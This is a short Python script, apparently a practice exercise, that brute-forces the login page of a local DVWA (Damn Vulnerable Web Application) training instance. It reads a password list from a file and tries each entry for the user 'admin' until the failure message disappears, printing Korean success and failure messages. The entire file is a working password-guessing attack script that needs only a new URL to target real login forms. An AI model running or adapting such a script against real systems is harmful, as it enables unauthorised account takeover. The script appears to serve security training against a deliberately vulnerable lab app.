import requests

URL="http://127.0.0.1/dvwa/vulnerabilities/brute/"
cookies = {'PHPSESSID': 'ur cokkie',
           'security': 'low'}

params = {'username':'',
          'password':'',
          'Login':'Login'}


with open('C:\\Users\\YOUR USER\\Downloads\\pw.txt', 'r') as f:
    pwline = f.readlines()

passwords =[]
for word in pwline:
    passwords.append(word.strip().replace('\n','')) 


for password in passwords:    
    params['username'] = 'admin'
    params['password'] = password

    req = requests.get(URL , params=params, cookies=cookies)
    
    if "Username and/or password incorrect." not in req.text:
        print(f'로그인 성공 : {password}')
        break
    else:
        print(f'로그인 실패 : {password}')
